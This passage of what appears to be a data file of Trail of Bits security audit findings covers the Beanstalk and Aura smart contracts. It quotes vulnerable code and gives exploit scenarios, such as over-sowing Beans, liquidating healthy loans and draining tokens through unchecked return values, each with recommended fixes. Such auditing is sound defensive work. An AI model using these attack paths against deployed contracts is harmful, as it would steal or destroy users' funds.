Figure 7.2: The transferToken() function in LibTransfer.sol#L29-43 The LibTransfer library uses the fromMode and toMode values to determine a transfers sender and receiver, respectively; in most cases, it uses the safeERC20 library to execute transfers. However, if fromMode and toMode are both marked as EXTERNAL , then the transferFrom function of the token contract will be called directly, and safeERC20 will not be used. Essentially, if a user tries to transfer a nonstandard ERC20 token that does not revert on failure and instead indicates a transactions success or failure in its return data, the user could be led to believe that failed token transfers were successful. Exploit Scenario Alice uses the TokenFacet contract to transfer nonstandard ERC20 tokens that return false on failure to another contract. However, Alice accidentally inputs an amount higher than her balance. The transaction is successfully executed, but because there is no check of the false return value, Alice does not know that her tokens were not transferred. Recommendations Short term, use the safeERC20 library for external token transfers. Long term, thoroughly review and document all interactions with arbitrary tokens to prevent similar issues from being introduced in the future.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "8. Plot transfers from users with allowances revert if the owner has an existing pod listing ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Whenever a plot transfer is executed by a user with an allowance (i.e., a transfer in which the caller was approved by the plots owner), the transfer will revert if there is an existing listing for the pods contained in that plot. The MarketplaceFacet contract exposes a function, transferPlot() , that allows the owner of a plot to transfer the pods in that plot to another user; additionally, the owner of a plot can call the approvePods() function (gure 8.1) to approve other users to transfer these pods on the owners behalf. function approvePods(address spender, uint256 amount) external payable nonReentrant { } require(spender != address(0), \"Field: Pod Approve to 0 address.\"); setAllowancePods(msg.sender, spender, amount); emit PodApproval(msg.sender, spender, amount); Figure 8.1: The approvePods() function in MarketplaceFacet.sol#L147-155 Once approved, the given address can call the transferPlot() function to transfer pods on the owners behalf. The function checks and decreases the allowance and then checks whether there is an existing pod listing for the target pods. If there is an existing listing, the function tries to cancel it by calling the _cancelPodListing() function. function transferPlot( address sender, address recipient, uint256 id, uint256 start, uint256 end ) external payable nonReentrant { require( sender != address(0) && recipient != address(0), \"Field: Transfer to/from 0 address.\" ); uint256 amount = s.a[sender].field.plots[id]; require(amount > 0, \"Field: Plot not owned by user.\"); require(end > start && amount >= end, \"Field: Pod range invalid.\"); amount = end - start; // Note: SafeMath is redundant here. if ( msg.sender != sender && allowancePods(sender, msg.sender) != uint256(-1) ) { decrementAllowancePods(sender, msg.sender, amount); } if (s.podListings[id] != bytes32(0)) { _cancelPodListing(id); // TODO: Look into this cancelling. } _transferPlot(sender, recipient, id, start, amount); } Figure 8.2: The transferPlot() function in MarketplaceFacet.sol#L119-145 The _cancelPodListing() function receives only an id as the input and relies on the msg.sender to determine the listings owner. However, if the transfer is executed by a user with an allowance, the msg.sender is the user who was granted the allowance, not the owner of the listing. As a result, the function will revert. function _cancelPodListing(uint256 index) internal { require( s.a[msg.sender].field.plots[index] > 0, \"Marketplace: Listing not owned by sender.\" ); delete s.podListings[index]; emit PodListingCancelled(msg.sender, index); } Figure 8.3: The _cancelPodListing() function in Listing.sol#L149-156 Exploit Scenario A new smart contract that integrates with the MarketplaceFacet contract is deployed. This contract has features allowing it to manage users pods on their behalf. Alice approves the contract so that it can manage her pods. Some time passes, and Alice calls one of the smart contracts functions, which requires Alice to transfer ownership of her plot to the contract. Because Alice has already approved the smart contract, it can perform the transfer on her behalf. To do so, it calls the transferPlot() function in the MarketplaceFacet contract; however, this call reverts because Alice has an open listing for the pods that the contract is trying to transfer. Recommendations Short term, add a new input to _cancelPodListing() that is equal to msg.sender if the caller is the owner of the listing, but equal to the pod owner if the caller is a user who was approved by the owner. Long term, thoroughly document the expected behavior of the MarketplaceFacet contract and the properties (invariants) it should enforce, such as plot transfers initiated by users with an allowance cancel the owners listing. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Users can sow more Bean tokens than are burned ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "An accounting error allows users to sow more Bean tokens than the available soil allows. Whenever the price of Bean is below its peg, the protocol issues soil. Soil represents the willingness of the protocol to take Bean tokens o the market in exchange for a pod. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as non-callable bonds that mature on a rst-in-rst-out (FIFO) basis as the protocol issues new Bean tokens. Whenever soil is available, users can call the sow() and sowWithMin() functions in the FieldFacet contract. function sowWithMin( uint256 amount, uint256 minAmount, LibTransfer.From mode ) public payable returns (uint256) { uint256 sowAmount = s.f.soil; require( sowAmount >= minAmount && amount >= minAmount && minAmount > 0, \"Field: Sowing below min or 0 pods.\" ); if (amount < sowAmount) sowAmount = amount; return _sow(sowAmount, mode); } Figure 9.1: The sowWithMin() function in FieldFacet.sol#L41-53 The sowWithMin() function ensures that there is enough soil to sow the given number of Bean tokens and that the call will not sow fewer tokens than the specied minAmount . Once it makes these checks, it calls the _sow() function. function _sow(uint256 amount, LibTransfer.From mode) internal returns (uint256 pods) { pods = LibDibbler.sow(amount, msg.sender); if (mode == LibTransfer.From.EXTERNAL) C.bean().burnFrom(msg.sender, amount); else { amount = LibTransfer.receiveToken(C.bean(), amount, msg.sender, mode); C.bean().burn(amount); } } Figure 9.2: The _sow() function in FieldFacet.sol#L55-65 The _sow() function rst calculates the number of pods that will be sown by calling the sow() function in the LibDibbler library, which performs the internal accounting and calculates the number of pods that the user is entitled to. function sow(uint256 amount, address account) internal returns (uint256) { AppStorage storage s = LibAppStorage.diamondStorage(); // We can assume amount <= soil from getSowAmount s.f.soil = s.f.soil - amount ; return sowNoSoil(amount, account); } function sowNoSoil(uint256 amount, address account) internal returns (uint256) { } AppStorage storage s = LibAppStorage.diamondStorage(); uint256 pods = beansToPods(amount, s.w.yield); sowPlot(account, amount, pods); s.f.pods = s.f.pods.add(pods) ; saveSowTime(); return pods; function sowPlot( address account, uint256 beans, uint256 pods ) private { AppStorage storage s = LibAppStorage.diamondStorage(); s.a[account].field.plots[s.f.pods] = pods; emit Sow(account, s.f.pods, beans, pods); } Figure 9.3: The sow() , sowNoSoil() , and sowPlot() functions in LibDibbler.sol#L41-53 Finally, the sowWithMin() function burns the Bean tokens from the callers account, removing them from the supply. To do so, the function calls burnFrom() if the mode parameter is EXTERNAL (i.e., if the Bean tokens to be burned are not escrowed in the contract) and burn() if the Bean tokens are escrowed. If the mode parameter is not EXTERNAL , the receiveToken() function is executed to update the internal accounting of the contract before burning the tokens. This function returns the number of tokens that were transferred into the contract. In essence, the receiveToken() function allows the contract to correctly account for token transfers into it and to manage internal balances without performing token transfers. function receiveToken( IERC20 token, uint256 amount, address sender, From mode ) internal returns (uint256 receivedAmount) { if (amount == 0) return 0; if (mode != From.EXTERNAL) { receivedAmount = LibBalance.decreaseInternalBalance( sender, token, amount, mode != From.INTERNAL ); if (amount == receivedAmount || mode == From.INTERNAL_TOLERANT) return receivedAmount; } token.safeTransferFrom(sender, address(this), amount - receivedAmount); return amount; } Figure 9.4: The receiveToken() function in FieldFacet.sol#L41-53 However, if the mode parameter is INTERNAL_TOLERANT , the contract allows the user to partially ll amount (i.e., to transfer as much as the user can), which means that if the user does not own the given amount of Bean tokens, the protocol simply burns as many tokens as the user owns but still allows the user to sow the full amount . Exploit Scenario Eve, a malicious user, spots the vulnerability in the FieldFacet contract and waits until Bean is below its peg and the protocol starts issuing soil. Bean nally goes below its peg, and the protocol issues 1,000 soil. Eve deposits a single Bean token into the contract by calling the transferToken() function in the TokenFacet contract. She then calls the sow() function with amount equal to 1000 and mode equal to INTERNAL_TOLERANT . The sow() function is executed, sowing 1,000 Bean tokens but burning only a single token. Recommendations Short term, modify the relevant code so that users Bean tokens are burned before the accounting for the soil and pods are updated and so that, if the mode eld is not EXTERNAL , the amount returned by receiveToken() is used as the input to LibDibbler.sow() . Long term, thoroughly document the expected behavior of the FieldFacet contract and the properties (invariants) it should enforce, such as the sow() function always sows as many Bean tokens as were burned. Expand the unit test suite to test that these properties hold.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "10. Pods may never ripen ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Whenever the price of Bean is below its peg, the protocol takes Bean tokens o the market in exchange for a number of p ods dependent on the current interest rate. Essentially, Bean owners loan their tokens to the protocol and receive pods in exchange. We can think of pods as loans that are repaid on a FIFO basis as the protocol issues new Bean tokens. A group of pods that are created together is called a plot. The queue of plots is referred to as the pod line. The pod line has no practical bound on its length, so during periods of decreasing demand, it can grow indenitely. No yield is awarded until the given plot owner is rst in line and until the price of Bean is above its value peg. While the protocol does not default on its debt, the only way for pods to ripen is if demand increases enough for the price of Bean to be above its value peg for some time. While the price of Bean is above its peg, a portion of newly minted Bean tokens is used to repay the rst plot in the pod line until fully repaid, decreasing the length of the pod line. During an extended period of decreasing supply, the pod line could grow long enough that lenders receive an unappealing time-weighted rate of return, even if the yield is increased; a suciently long pod line could encourage usersuncertain of whether future demand will grow enough for them to be repaidto sell their Bean tokens rather than lending them to the protocol. Under such circumstances, the protocol will be unable to disincentivize Bean market sales, disrupting its ability to return Bean to its value peg. Exploit Scenario Bean goes through an extended period of increasing demand, overextending its supply. Then, demand for Bean tokens slowly and steadily declines, and the pod line grows in length. At a certain point, some users decide that their time-weighted rate of return is unfavorable or too uncertain despite the promised high yields. Instead of lending their Bean tokens to the protocol, they sell. Recommendations Explore options for backing Bean s value with an oer that is guaranteed to eventually be fullled. 11. Bean and the o\u0000er backing it are strongly correlated Severity: Undetermined Diculty: Undetermined Type: Economic Finding ID: TOB-BEANS-011 Target: The Beanstalk protocol", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "12. Ability to whitelist assets uncorrelated with Bean price, misaligning governance incentives ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "Stalk is the governance token of the system, rewarded to users who deposit certain whitelisted assets into the silo, the systems asset storage. When demand for Bean increases, the protocol increases the Bean supply by minting new Bean tokens and allocating some of them to Stalk holders. Additionally, if the price of Bean remains above its peg for an extended period of time, then a season of plenty (SoP) occurs: Bean is minted and sold on the open market in exchange for exogenous assets such as ETH. These exogenous assets are allocated entirely to Stalk holders. When demand for Bean decreases, the protocol decreases the Bean supply by borrowing Bean tokens from Bean owners. If the demand for Bean is persistently low and some of these loans are never repaid, Stalk holders are not directly penalized by the protocol. However, if the only whitelisted assets are strongly correlated with the price of Bean (such as ETH:BEAN LP tokens), then the value of Stalk holders deposited collateral would decline, indirectly penalizing Stalk holders for an unhealthy system. If, however, exogenous assets without a strong correlation to Bean are whitelisted, then Stalk holders who have deposited such assets will be protected from nancial penalties if the price of Bean crashes. Exploit Scenario Stalk holders vote to whitelist ETH as a depositable asset. They proceed to deposit ETH and begin receiving shares of rewards, including 3CRV tokens acquired during SoPs. Governance is now incentivized to increase the supply of Bean as high as possible to obtain more 3CRV rewards, which eventually results in an overextension of the Bean supply and a subsequent price crash. After the Bean price crashes, Stalk holders withdraw their deposited ETH and 3CRV rewards. Because ETH is not strongly correlated with the price of Bean, they do not suer nancial loss as a result of the crash. Alternatively, because of the lack of on-chain enforcement of o-chain votes, the above scenario could occur if the community multisignature wallet whitelists ETH, even if no related vote occurred. Recommendations Do not allow any assets that are not strongly correlated with the price of Bean to be whitelisted. Additionally, implement monitoring systems that provide alerts every time a new asset is whitelisted.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "13. Unchecked burnFrom return value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-beanstalk-securityreview.pdf", "body": "While recapitalizing the Beanstalk protocol, Bean and LP tokens that existed before the 2022 governance hack are represented as unripe tokens. Ripening is the process of burning unripe tokens in exchange for a pro rata share of the underlying assets generated during the Barn Raise. Holders of unripe tokens call the ripen function to receive their portion of the recovered underlying assets. This portion grows while the price of Bean is above its peg, incentivizing users to ripen their tokens later, when more of the loss has been recovered. The ripen code assumes that if users try to redeem more unripe tokens than they hold, burnFrom will revert. If burnFrom returns false instead of reverting, the failure of the balance check will go undetected, and the caller will be able to recover all of the underlying tokens held by the contract. While LibUnripe.decrementUnderlying will revert on calls to ripen more than the contracts balance, it does not check the users balance. The source code of the unripeToken contract was not provided for review during this audit, so we could not determine whether its burnFrom method is implemented safely. function ripen ( address unripeToken , uint256 amount , LibTransfer.To mode ) external payable nonReentrant returns ( uint256 underlyingAmount ) { underlyingAmount = getPenalizedUnderlying(unripeToken, amount); LibUnripe.decrementUnderlying(unripeToken, underlyingAmount); IBean(unripeToken).burnFrom( msg.sender , amount); address underlyingToken = s.u[unripeToken].underlyingToken; IERC20(underlyingToken).sendToken(underlyingAmount, msg.sender , mode); emit Ripen( msg.sender , unripeToken, amount, underlyingAmount); } Figure 13.1: The ripen() function in UnripeFacet.sol#L51- Exploit Scenario Alice notices that the burnFrom function is implemented incorrectly in the unripeToken contract. She calls ripen with an amount greater than her unripe token balance and is able to receive the contracts entire balance of underlying tokens. Recommendations Short term, add an assert statement to ensure that users who call ripen have sucient balance to burn the given amount of unripe tokens. Long term, implement all security-critical assertions on user-supplied input in the beginning of external functions. Do not rely on untrusted code to perform required safety checks or to behave as expected.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Healthy loans can be liquidated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "Due to missing validation that the loan's threshold is less than the LTV, an arbitrary loan can be liquidated if the threshold is between the MAX_PENALTY_LTV and MAX_THRESHOLD variables. When loans are insolvent, liquidations via the stability pool can occur by calling the absorb function, which will use funds from the stability pool to cover a borrower's debt. To verify that a loan is liquidatable, the loan's LTV is checked against the MAX_PENALTY_LTV variable, with the rationale that the loan's threshold must be less than the LTV. This would mean that the loan's LTV is larger than the threshold , marking it insolvent: // Performs stability pool liquidations to pay down a trove's debt in full and transfer the // freed collateral to the stability pool. If the stability pool does not have sufficient yin, // the trove's debt and collateral will be proportionally redistributed among all troves // containing the trove's collateral. // - Amount of debt distributed to each collateral = (value of collateral / trove value) * trove debt // Reverts if the trove's LTV is not above the maximum penalty LTV // - This also checks the trove is liquidatable because threshold must be lower than max penalty LTV. // Returns a tuple of an ordered array of yang addresses and an ordered array of asset amounts // in the decimals of each respective asset due to the caller as compensation. #[external] fn absorb (trove_id: u64 ) -> (Span<ContractAddress>, Span< u128 >) { let shrine: IShrineDispatcher = shrine::read(); let (trove_threshold, trove_ltv, trove_value, trove_debt) = shrine.get_trove_info(trove_id); assert(trove_ltv.val > MAX_PENALTY_LTV, 'PU: Not absorbable'); Figure 1.1: The absorb function ( Purger.cairo#L167-L181 ) However, the threshold may not be less than the MAX_PENALTY_LTV variable. The only bound it has is the MAX_THRESHOLD variable, which is larger than MAX_PENALTY_LTV : const MAX_THRESHOLD: u128 = 1000000000000000000000000000 ; // (ray): RAY_ONE Figure 1.2: The MAX_THRESHOLD constant ( Shrine.cairo #L31 ) #[external] fn set_threshold (yang: ContractAddress , new_threshold: Ray ) { AccessControl::assert_has_role(ShrineRoles::SET_THRESHOLD); assert(new_threshold.val <= MAX_THRESHOLD, 'SH: Threshold > max'); thresholds::write(get_valid_yang_id(yang), new_threshold); // Event emission ThresholdUpdated(yang, new_threshold); } Figure 1.3: The set_threshold function ( Shrine.cairo#L449-L458 ) As a result, if a loan has MAX_PENALTY_LTV < threshold < MAX_THRESHOLD and LTV < threshold , it will incorrectly be agged for liquidation. Exploit Scenario Alice, a borrower, has a position with an LTV of 90% and a threshold of 95%. Eve, a malicious user, calls absorb and incorrectly liquidates Alice's position. As a result, Alice loses her funds. Recommendations Short term, set the MAX_THRESHOLD value to be the same as the MAX_PENALTY_LTV value. Long term, improve unit tests to increase coverage and ensure intended behavior throughout the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "2. block.timestamp is entirely determined by the sequencer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "The block.timestamp value is used throughout the codebase for validating critical operations that depend on the time. However, in Starknet, there are currently no restrictions on the return values of the get_block_timestamp() function. As a result, the sequencer can submit an arbitrary timestamp that may not be correct. Exploit Scenario The sequencer of Starknet returns an incorrect block.timestamp , which causes many important checks throughout the protocol to fail (e.g., oracle and interest rate updates). As a result, the Aura protocol is unusable. Recommendations Short term, keep parts of the codebase that depend on the timestamp to a minimum. Long term, stay up to date with the latest Starknet documentation.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Incorrect event emission in the Equalizer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "When the equalize function is called in the Equalizer contract, the function iterates over the array of addresses to be allocated to. This is implemented by popping the rst element from the recipients and percentages arrays and looping until the array is empty. After all the allocations have been performed, the function emits an event that records the contents of the recipients array, the contents of the percentages array, and the total surplus that was minted. However, because the arrays are modied during execution, the values emitted in the event will be incorrect. loop { match recipients. pop_front() { Option :: Some (recipient) => { let amount: Wad = rmul_wr(surplus, *(percentages. pop_front() .unwrap())); shrine.inject(*recipient, amount); minted_surplus += amount; }, Option :: None (_) => { break ; } }; }; // Safety check to assert yin is less than or equal to total debt after minting surplus // It may not be equal due to rounding errors let updated_total_yin: Wad = shrine.get_total_yin(); assert(updated_total_yin <= total_debt, 'EQ: Yin exceeds debt'); Equalize( recipients, percentages, minted_surplus); Figure 3.1: A snippet of the equalize function ( equalizer.cairo#L100-L119 ) Exploit Scenario An issue in the Equalizer (either due to a bug or an error when setting the Allocator ) results in surplus being minted in the wrong proportions. This is discovered after several epochs, and the Aura team reviews event logs to trace the impact. The incorrect Equalize events make this eort more dicult. Recommendations Short term, update the equalize function so that it emits accurate information. This could include modifying the loop to use a counter, making a copy of the arrays before looping, or removing these arrays from the event emission. Long term, carefully consider how the ability to log state changes could be impacted when designing loops that will process data.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Unchecked ERC-20 return values in the Absorber ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "The transfer_assets function in the Absorber contract serves as a helper function to transfer multiple assets to a target address in one function call. Per the ERC-20 standard, calls to the transfer function return a Boolean indicating whether the call was successful, and developers must not assume that false is never returned and that the token contract will revert instead. However, the return value of the call to transfer in transfer_assets is not checked. As the tokens being transferred by this function will be third-party contracts, and given the history of diering ERC-20 implementations in the Ethereum ecosystem, validating the outcome of these function calls is strongly recommended. Option :: Some (asset) => { let asset_amt: u128 = *asset_amts.pop_front().unwrap(); if asset_amt != 0 { let asset_amt: u256 = asset_amt.into(); IERC20Dispatcher { contract_address: *asset }.transfer(to, asset_amt); } }, Figure 4.1: A snippet from the transfer_assets function ( absorber.cairo#L893-L899 ) Exploit Scenario Alice is a provider in the Absorber . One of the collateral tokens is briey paused to perform an upgrade. While the token is paused, Alice attempts to claim her share of the absorbed collateral and rewards. The transfer of the paused token fails silently and Alice loses some of her share of the absorbed assets. Recommendations Short term, add a check to verify that the transfer call in transfer_assets was successful. Long term, always have the code validate return values whenever possible, especially when interacting with third-party contracts.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Incorrect loop starting index in propagate_reward_errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "In the Absorber contract, reward tokens are stored in a mapping based on their reward ID, starting at 1. Most instances where the set of reward tokens is iterated over properly start the loop at 1, but in the propagate_reward_errors function, the current_rewards_id counter is initialized to 0, contrary to the comment above the function. // total number of reward tokens, starting from 1 // a reward token cannot be removed once added. rewards_count: u8 , // mapping from a reward token address to its id for iteration reward_id: LegacyMap ::<ContractAddress, u8 >, // mapping from a reward token ID to its Reward struct: // 1. the ERC-20 token address // 2. the address of the vesting contract (blesser) implementing `IBlesser` for the ERC-20 token // 3. a boolean indicating if the blesser should be called rewards: LegacyMap ::< u8 , Reward>, Figure 5.1: The declaration of the rewards data structures ( absorber.cairo#L103-L112 ) // `current_rewards_id` should start at `1`. fn propagate_reward_errors (rewards_count: u8 , epoch: u32 ) { let mut current_rewards_id: u8 = 0 ; Figure 5.2: A snippet of the propagate_reward_errors function ( absorber.cairo#L1087-L1089 ) Recommendations Short term, update the index to start at 1. Long term, carefully review the upper and lower bounds of loops, especially when the codebase uses both 0-indexed and 1-indexed loops.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Redistributions may not account for accrued interest on debt ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "During a stability pool liquidation, yin taken from the Absorber contract is used to repay a troves debt and restore solvency. The troves collateral is then sent back to the Absorber as a reward. If the Absorber does not have enough yin to cover all of a troves bad debt, a redistribution occurs. During a redistribution, the debt and collateral from an insolvent trove are allocated to all the remaining troves in the system. // If absorber does not have sufficient yin balance to pay down the trove's debt in full, // cap the amount to pay down to the absorber's balance (including if it is zero). let purge_amt = min(max_purge_amt, absorber_yin_bal); // Transfer a percentage of the penalty to the caller as compensation let (yangs, compensations) = free(shrine, trove_id, compensation_pct, caller); let can_absorb_any: bool = purge_amt.is_non_zero(); let is_fully_absorbed: bool = purge_amt == max_purge_amt; // Only update the absorber and emit the `Purged` event if Absorber has some yin // to melt the trove's debt and receive freed trove assets in return if can_absorb_any { let percentage_freed: Ray = get_percentage_freed( ltv_after_compensation, value_after_compensation, trove_debt, trove_penalty, purge_amt ); // Melt the trove's debt using the absorber's yin directly shrine.melt(absorber.contract_address, trove_id, purge_amt); // Free collateral corresponding to the purged amount let (yangs, absorbed_assets_amts) = free( shrine, trove_id, percentage_freed, absorber.contract_address ); absorber.update(yangs, absorbed_assets_amts); Purged( trove_id, purge_amt, percentage_freed, absorber.contract_address, absorber.contract_address, yangs, absorbed_assets_amts ); } // If it is not a full absorption, perform redistribution. if !is_fully_absorbed { shrine.redistribute(trove_id); // Update yang prices due to an appreciation in ratio of asset to yang from // redistribution oracle::read().update_prices(); } Compensate(caller, yangs, compensations); (yangs, compensations) } Figure 6.1: A snippet of the absorb function ( purger.cairo#L299-L352 ) However, the redistributed debt may not correctly accrue interest. The redistribute function assumes that shrine.melt , which uses the charge function to accrue interest, was called. However, if the can_absorb_any variable is false , then shrine.melt will never be called and the interest on the troves debt will never be correctly accrued. // Trove's debt should have been updated to the current interval via `melt` in `Purger.purge`. // The trove's debt is used instead of estimated debt from `get_trove_info` to ensure that // system has accounted for the accrued interest. Figure 6.2: The comment in the redistribute function ( shrine.cairo#L732-L734 ) Exploit Scenario Due to a series of liquidations, the Absorber has a remaining yin balance of 0 . Eve has a position that is eligible for liquidation due to a large amount of interest accrued on her debt. Eve calls the absorb function, and because there is no yin in the Absorber , the interest is never accrued. As a result, the system incorrectly has more bad debt than was redistributed. Recommendations Short term, modify the code to make a call to the charge function in the redistribute function. Long term, keep track of the necessary state changes needed before and after an operation, and make sure to have the code handle edge cases where these state changes may not occur.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "7. Marginal penalty may be scaled even if the threshold is equal to the absorption threshold ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "If a trove becomes eligible for liquidation, a penalty is applied to punish users who have insolvent positions. When computing the absorption penalty, the get_absorption_penalty function is used. As the comment above the function says, if the LTV exceeds the absorption threshold, the marginal penalty is scaled by the penalty scalar. However, the function will also scale the penalty if the troves threshold is equal to the absorption threshold. This could cause a user to have to pay a higher penalty than originally intended. // If LTV exceeds ABSORPTION_THRESHOLD, the marginal penalty is scaled by `penalty_scalar`. fn get_absorption_penalty_internal ( threshold: Ray , ltv: Ray , ltv_after_compensation: Ray ) -> Option <Ray> { if ltv <= threshold { return Option :: None (()); } // It's possible for `ltv_after_compensation` to be greater than one, so we handle this case // to avoid underflow. Note that this also guarantees `ltv` is lesser than one. if ltv_after_compensation > RAY_ONE.into() { return Option :: Some (RayZeroable::zero()); } // The `ltv_after_compensation` is used to calculate the maximum penalty that can be charged // at the trove's current LTV after deducting compensation, while ensuring the LTV is not worse off // after absorption. let max_possible_penalty = min( (RAY_ONE.into() - ltv_after_compensation) / ltv_after_compensation, MAX_PENALTY.into() ); if threshold >= ABSORPTION_THRESHOLD.into() { let s = penalty_scalar::read(); let penalty = min( MIN_PENALTY.into() + s * ltv / threshold - RAY_ONE.into(), max_possible_penalty ); return Option :: Some (penalty); } Figure 7.1: The penalty calculation ( purger.cairo#L450-L478 ) Exploit Scenario Alice, a user of the Aura protocol, opens a trove. After market conditions change, her trove becomes eligible for liquidation. However, because her troves threshold is equal to the absorption threshold, she must pay an extra penalty beyond that intended. Recommendations Short term, update the conditional to the following: if threshold > ABSORPTION_THRESHOLD.into() Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. The share conversion rate may be zero even if the Absorber is not empty ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "After a stability pool liquidation by the Absorber contract, the update function is used to update the shares of seized collateral that stakers are entitled to. In addition, if the amount of yin in the stability pool becomes empty or goes below the YIN_SHARE_PER_THRESHOLD constant value, a new epoch is started. When a new epoch is started, the epoch_share_conversion_rate variable must be set appropriately. This variable determines the rate at which vault shares can be exchanged for underlying yin and rewards. If there is no yin in the Absorber , the conversion rate is 0; otherwise, the conversion rate must be 1:1. if YIN_PER_SHARE_THRESHOLD > yin_per_share.val { let new_epoch: u32 = current_epoch + 1 ; current_epoch::write(new_epoch); // If new epoch's yin balance exceeds the initial minimum shares, deduct the initial // minimum shares worth of yin from the yin balance so that there is at least such amount // of yin that cannot be removed in the next epoch. if INITIAL_SHARES <= yin_balance.val { let epoch_share_conversion_rate: Ray = wadray::rdiv_ww( yin_balance - INITIAL_SHARES.into(), total_shares ); epoch_share_conversion_rate::write(current_epoch, epoch_share_conversion_rate); total_shares::write(yin_balance); } else { // Otherwise, set the epoch share conversion rate to 0 and total shares to 0. // This is to prevent an attacker from becoming a majority shareholder // in a new epoch when the number of shares is very small, which would // allow them to execute an attack similar to a first-deposit front-running attack. // This would cause a negligible loss to the previous epoch's providers, but // partially compensates the first provider in the new epoch for the deducted // minimum initial amount. epoch_share_conversion_rate::write(current_epoch, 0_ u128 .into()); total_shares::write( 0_ u128 .into()); } Figure 8.1: Part of the update function ( absorber.cairo#L596-L609 ) However, due to the incorrect conditional check, it may be possible for the epoch conversion rate to be 0, even if there is yin remaining in the Absorber . If the balance of yin after a stability pool liquidation is equal to the INITIAL_SHARES constant value, then the epoch_share_conversion_rate will be set to 0 while the total_shares variable will be set to 1,000 (the value of INITIAL_SHARES ). This could lead to unexpected behavior and incorrect protocol accounting downstream. Exploit Scenario After a stability pool liquidation, the Absorber is left with 1,000 yin. The update function incorrectly sets the epoch_share_conversion rate to 0 after the liquidation. When Alice, a staker in the Absorber , tries to withdraw some of her rewards for the epoch, the protocol incorrectly calculates her reward balance as 0. As a result, Alice loses some of her rewards. Recommendations Short term, update the conditional to the following: if INITIAL_SHARES < yin_balance.val Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "9. Missing safety check in the Purgers absorb function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "The Purger has separate entry point functions for performing searcher liquidations ( liquidate ) and for triggering absorptions and redistributions ( absorb ). For the most part, both functions follow a comparable sequence of steps with one exception: after updating the troves debt and seizing the collateral, liquidate includes an extra safety check that will revert if the troves LTV somehow increased as a result of the liquidation, while absorb omits any such check. This should not be possible in normal operations, but consistent application of this check could block a future bug or edge case in liquidation logic from being exploitable. shrine.melt(funder, trove_id, purge_amt); // Free collateral corresponding to the purged amount let (yangs, freed_assets_amts) = free(shrine, trove_id, percentage_freed, recipient); // Safety check to ensure the new LTV is lower than old LTV let (_, updated_trove_ltv, _, _) = shrine.get_trove_info(trove_id); assert(updated_trove_ltv <= trove_ltv, 'PU: LTV increased'); Figure 9.1: The extra safety check ( purger.cairo#L245-L252 ) Recommendations Short term, add the missing check to the absorb function to ensure its LTV never increases. Long term, review functionalities that perform similar operations and ensure they follow comparable steps.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Pair IDs are not validated to be unique ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-aura-securityreview.pdf", "body": "When adding a yang to the Pragma contract, a pair_id is specied. This pair_id acts as a unique identier that determines the price feed used by Pragma. For example, the pair_id for the ETH/USD price feed would be the felt252 representation of the string ETH/USD . However, there is no check that the pair_id is unique when adding a yang. This could lead to a dierent yang using an incorrect price feed instead of the intended one. #[external] fn add_yang (pair_id: u256 , yang: ContractAddress ) { AccessControl::assert_has_role(PragmaRoles::ADD_YANG); assert(pair_id != 0 , 'PGM: Invalid pair ID'); assert(yang.is_non_zero(), 'PGM: Invalid yang address'); assert_new_yang(yang); // doing a sanity check if Pragma actually offers a price feed // of the requested asset and if it's suitable for our needs let response: PricesResponse = oracle::read().get_data_median(DataType::Spot(pair_id)); // Pragma returns 0 decimals for an unknown pair ID assert(response.decimals != 0 , 'PGM: Unknown pair ID'); assert(response.decimals <= 18_ u256, 'PGM: Too many decimals'); let index: u32 = yangs_count::read(); let settings = YangSettings { pair_id, yang }; Figure 10.1: The add_yang function ( pragma.cairo#L178-L193 ) Exploit Scenario Alice, the admin of the contracts, accidentally uses the ETH/USD pair_id when adding wBTC as a yang in the Pragma contract. Despite ETH being already added, the price feed for wBTC will incorrectly use the ETH/USD feed, resulting in a completely 